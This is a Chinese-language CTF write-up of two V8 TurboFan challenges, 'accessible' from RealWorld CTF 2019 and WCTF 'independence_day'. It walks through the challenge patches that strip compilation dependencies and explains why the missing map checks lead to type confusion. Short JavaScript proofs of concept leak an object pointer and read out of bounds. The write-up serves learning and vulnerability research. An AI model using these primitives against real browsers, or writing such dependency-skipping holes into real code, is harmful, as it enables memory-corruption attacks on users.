## RealWorld ctf 2019 accessible
### patch

```
diff --git a/src/compiler/access-info.cc b/src/compiler/access-info.cc
index 0744138..1df06df 100644
--- a/src/compiler/access-info.cc
+++ b/src/compiler/access-info.cc
@@ -370,9 +370,11 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
       // The field type was cleared by the GC, so we don't know anything
       // about the contents now.
     }
+#if 0
     unrecorded_dependencies.push_back(
         dependencies()->FieldRepresentationDependencyOffTheRecord(map_ref,
                                                                   descriptor));
+#endif
     if (descriptors_field_type->IsClass()) {
       // Remember the field map, and try to infer a useful type.
       Handle<Map> map(descriptors_field_type->AsClass(), isolate());
@@ -384,15 +386,17 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
   }
   // TODO(turbofan): We may want to do this only depending on the use
   // of the access info.
+#if 0
   unrecorded_dependencies.push_back(
       dependencies()->FieldTypeDependencyOffTheRecord(map_ref, descriptor));
+#endif
 
   PropertyConstness constness;
   if (details.IsReadOnly() && !details.IsConfigurable()) {
     constness = PropertyConstness::kConst;
   } else {
     map_ref.SerializeOwnDescriptor(descriptor);
-    constness = dependencies()->DependOnFieldConstness(map_ref, descriptor);
+    constness = PropertyConstness::kConst;
   }
   Handle<Map> field_owner_map(map->FindFieldOwner(isolate(), descriptor),
                               isolate());
```
patch 删除了两处unrecorded_dependencies.push_back，同时让constness始终被赋值为PropertyConstness::kConst。

我们从AccessInfoFactory::ComputeDataFieldAccessInfo函数看起：

```

PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo(
    Handle<Map> receiver_map, Handle<Map> map, MaybeHandle<JSObject> holder,
    int descriptor, AccessMode access_mode) const {
  ...
  Handle<DescriptorArray> descriptors(map->instance_descriptors(), isolate());
  PropertyDetails const details = descriptors->GetDetails(descriptor);
  ...
  Representation details_representation = details.representation();
  ...
```
首选从map中取出了instance_descriptors，它存储了对像属性，接着就根据descriptors->GetDetails(descriptor)获取了属性 PropertyDetails。

```
  if (details_representation.IsNone()) {
    ...
  }
  ZoneVector<CompilationDependency const*> unrecorded_dependencies(zone());
  if (details_representation.IsSmi()) {
    ...
    unrecorded_dependencies.push_back(
        dependencies()->FieldRepresentationDependencyOffTheRecord(map_ref,
                                                                  descriptor));
  } else if (details_representation.IsDouble()) {
    ...
    unrecorded_dependencies.push_back(
          dependencies()->FieldRepresentationDependencyOffTheRecord(
              map_ref, descriptor));
  } else if (details_representation.IsHeapObject()) {
    ...
#if 0
    unrecorded_dependencies.push_back(
        dependencies()->FieldRepresentationDependencyOffTheRecord(map_ref,
                                                                  descriptor));
#endif
  } else {
      ...
  }	
#if 0
  unrecorded_dependencies.push_back(
      dependencies()->FieldTypeDependencyOffTheRecord(map_ref, descriptor));
#endif
  ...
```

接着会依次判断属性的类型，之后会将通过检查的属性加入到unrecorded_dependencies，我们的patch也就是在这里删去了两个unrecorded_dependencies，此时除了Double和SMI类型的对象，其他的对象的类型都不会被push到unrecorded_dependencies。

```
PropertyConstness constness;
if (details.IsReadOnly() && !details.IsConfigurable()) {
  constness = PropertyConstness::kConst;
} else {
  map_ref.SerializeOwnDescriptor(descriptor);
  constness = PropertyConstness::kConst;
}
Handle<Map> field_owner_map(map->FindFieldOwner(isolate(), descriptor),
                            isolate());
switch (constness) {
  case PropertyConstness::kMutable:
    return PropertyAccessInfo::DataField(
        zone(), receiver_map, std::move(unrecorded_dependencies), field_index,
        details_representation, field_type, field_owner_map, field_map,
        holder);
  case PropertyConstness::kConst:
    return PropertyAccessInfo::DataConstant(
        zone(), receiver_map, std::move(unrecorded_dependencies), field_index,
        details_representation, field_type, field_owner_map, field_map,
        holder);
}
```
并且patch还将所有属性都标注为了PropertyConstness::kConst。

这里插入一点知识：

v8有两种保证runtime优化代码中对类型假设的安全性的方法：

- 对于stable map，就通过注册compilation dependencies的回调到map中（dependencies中保存可能影响map假设的元素），通过检查这些dependency的改变来触发回调函数进行deoptimize。
- 对于非stable map，则添加CheckMaps节点来对类型进行检查，当类型不符合预期时将会bail out。

这部分代码如下：

```
Reduction JSNativeContextSpecialization::ReduceElementAccess(
  ...
    // Perform map check on the {receiver}.
    access_builder.BuildCheckMaps(receiver, &effect, control,
                                  access_info.receiver_maps());
...
void PropertyAccessBuilder::BuildCheckMaps(
    Node* receiver, Node** effect, Node* control,
    ZoneVector<Handle<Map>> const& receiver_maps) {
  HeapObjectMatcher m(receiver);
  if (m.HasValue()) {
    MapRef receiver_map = m.Ref(broker()).map();
    if (receiver_map.is_stable()) {
      for (Handle<Map> map : receiver_maps) {
        if (MapRef(broker(), map).equals(receiver_map)) {
          dependencies()->DependOnStableMap(receiver_map);
          return;
        }
      }
    }
  }
  ZoneHandleSet<Map> maps;
  CheckMapsFlags flags = CheckMapsFlag::kNone;
  for (Handle<Map> map : receiver_maps) {
    MapRef receiver_map(broker(), map);
    maps.insert(receiver_map.object(), graph()->zone());
    if (receiver_map.is_migration_target()) {
      flags |= CheckMapsFlag::kTryMigrateInstance;
    }
  }
  *effect = graph()->NewNode(simplified()->CheckMaps(flags, maps), receiver,
                             *effect, control);
}
```
#### stable map

Maps are marked stable when the code to access their elements is already optimized.

```
arr = [1.1, 2.2, 3.3,4.4];
// make the map stable
arr.x = 1;
```


回到题目中：
AccessInfoFactory::ComputeDataFieldAccessInfo函数最终返回一个PropertyAccessInfo对象

```
PropertyAccessInfo::PropertyAccessInfo(
    Kind kind, MaybeHandle<JSObject> holder, MaybeHandle<Map> transition_map,
    FieldIndex field_index, Representation field_representation,
    Type field_type, Handle<Map> field_owner_map, MaybeHandle<Map> field_map,
    ZoneVector<Handle<Map>>&& receiver_maps,
    ZoneVector<CompilationDependency const*>&& unrecorded_dependencies)
    : kind_(kind),
      receiver_maps_(receiver_maps),
      unrecorded_dependencies_(std::move(unrecorded_dependencies)),
      transition_map_(transition_map),
      holder_(holder),
      field_index_(field_index),
      field_representation_(field_representation),
      field_type_(field_type),
      field_owner_map_(field_owner_map),
      field_map_(field_map) {
  DCHECK_IMPLIES(!transition_map.is_null(),
                 field_owner_map.address() == transition_map.address());
}
```
unrecorded_dependencies初始化赋值给了unrecorded_dependencies_，而在void PropertyAccessInfo::RecordDependencies(
    CompilationDependencies* dependencies)中，unrecorded_dependencies_转移到了CompilationDependencies类的私有成员dependencies_。
    

### rootcase
```
Reduction TypedOptimization::ReduceCheckMaps(Node* node) {
  // The CheckMaps(o, ...map...) can be eliminated if map is stable,
  // o has type Constant(object) and map == object->map, and either
  //  (1) map cannot transition further, or
  //  (2) we can add a code dependency on the stability of map
  //      (to guard the Constant type information).
  Node* const object = NodeProperties::GetValueInput(node, 0);
  Type const object_type = NodeProperties::GetType(object);
  Node* const effect = NodeProperties::GetEffectInput(node);
  base::Optional<MapRef> object_map =
      GetStableMapFromObjectType(broker(), object_type);
  if (object_map.has_value()) {
    for (int i = 1; i < node->op()->ValueInputCount(); ++i) {
      Node* const map = NodeProperties::GetValueInput(node, i);
      Type const map_type = NodeProperties::GetType(map);
      if (map_type.IsHeapConstant() &&
          map_type.AsHeapConstant()->Ref().equals(*object_map)) {
        if (object_map->CanTransition()) {
          dependencies()->DependOnStableMap(*object_map);
        }
        return Replace(effect);
      }
    }
  }
  return NoChange();
}
```
在这里简单梳理一下，由于patch做了一些删除，所以导致例如HeapObject类型不会被加入dependencies中，而对于有dependencies的对象（即stable map），则不会产生check map，此时就会出现一个HeapObject的属性无检测，这样的话我们就可以得到类型混淆了。
```
var obj = {};
obj.c = {a: 1.1};

function leaker(o){
    return o.c.a;
}
for (var i = 0; i < 0x4000; i++) {
    leaker(obj);
}

var buf_to_leak = new ArrayBuffer();
obj.c = {b: buf_to_leak}

console.log(leaker(obj)) //output: 2.0289592652999e-310
```
这里有个小坑，在看大佬博客时看到：“注意：修改obj.c时不能使用同属性名，如{a: buf_to_leak}，因为事实上仍然存在一些依赖会影响到deoptimize”


## wctf independence_day

### patch

```
diff --git a/src/objects/code.cc b/src/objects/code.cc
index 24817ca65c..4079f6077d 100644
--- a/src/objects/code.cc
+++ b/src/objects/code.cc
@@ -925,6 +925,7 @@ void DependentCode::InstallDependency(Isolate* isolate,
                                       const MaybeObjectHandle& code,
                                       Handle<HeapObject> object,
                                       DependencyGroup group) {
+#if 0
   Handle<DependentCode> old_deps(DependentCode::GetDependentCode(object),
                                  isolate);
   Handle<DependentCode> new_deps =
@@ -932,6 +933,7 @@ void DependentCode::InstallDependency(Isolate* isolate,
   // Update the list head if necessary.
   if (!new_deps.is_identical_to(old_deps))
     DependentCode::SetDependentCode(object, new_deps);
+#endif
 }
 
 Handle<DependentCode> DependentCode::InsertWeakCode(
```
禁用了code dependencies.

```
commit 3794e5f0eeee3d421cc0d2a8d8b84ac82d37f10d
Author: Your Name <you@example.com>
Date:   Sat Dec 15 18:21:08 2018 +0100

    strip global in realms

diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 98bc56ad25..e72f528ae5 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -1043,9 +1043,8 @@ MaybeLocal<Context> Shell::CreateRealm(
     }
     delete[] old_realms;
   }
-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
   Local<Context> context =
-      Context::New(isolate, nullptr, global_template, global_object);
+      Context::New(isolate, nullptr, ObjectTemplate::New(isolate), v8::MaybeLocal<Value>());
   DCHECK(!try_catch.HasCaught());
   if (context.IsEmpty()) return MaybeLocal<Context>();
   InitializeModuleEmbedderData(context);
```
禁用了wasm

结合上面的知识，就很好理解这个patch了，对于stable map，并不会生成check map而是会去创建一个compile dependency，但是这部分内容被patch掉了，所以就导致对于一个stable map的array，将不会有类型检查，这样的话就可以得到类型混淆漏洞了。

```
arr = [1.1, 2.2, 3.3,4.4];
// make the map stable
arr.x = 1;
function foo(idx) {
    return arr[idx];
}
// optimize foo
for (i = 0; i < 100000; i++){
    foo(1);
}
// change arr to dictionary map
arr[0x100000] = 5.5;
console.log(foo(1000));
```



